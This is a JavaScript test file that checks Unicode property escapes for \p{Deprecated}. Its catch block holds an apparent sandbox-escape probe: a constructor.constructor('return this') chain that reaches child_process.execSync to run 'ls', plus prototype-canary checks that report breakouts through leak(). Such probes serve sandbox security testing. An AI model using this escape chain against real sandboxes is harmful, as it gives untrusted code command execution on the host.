try {
    const matchSymbols = buildString({
        loneCodePoints: [
            329,
            1651,
            3959,
            3961,
            917505
        ],
        ranges: [
            [
                6051,
                6052
            ],
            [
                8298,
                8303
            ],
            [
                9001,
                9002
            ]
        ]
    });
    testPropertyEscapes(/^\p{Deprecated}+$/u, matchSymbols, '\\p{Deprecated}');
    testPropertyEscapes(/^\p{Dep}+$/u, matchSymbols, '\\p{Dep}');
    const nonMatchSymbols = buildString({
        loneCodePoints: [3960],
        ranges: [
            [
                56320,
                57343
            ],
            [
                0,
                328
            ],
            [
                330,
                1650
            ],
            [
                1652,
                3958
            ],
            [
                3962,
                6050
            ],
            [
                6053,
                8297
            ],
            [
                8304,
                9000
            ],
            [
                9003,
                56319
            ],
            [
                57344,
                917504
            ],
            [
                917506,
                1114111
            ]
        ]
    });
    testPropertyEscapes(/^\P{Deprecated}+$/u, nonMatchSymbols, '\\P{Deprecated}');
    testPropertyEscapes(/^\P{Dep}+$/u, nonMatchSymbols, '\\P{Dep}');
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}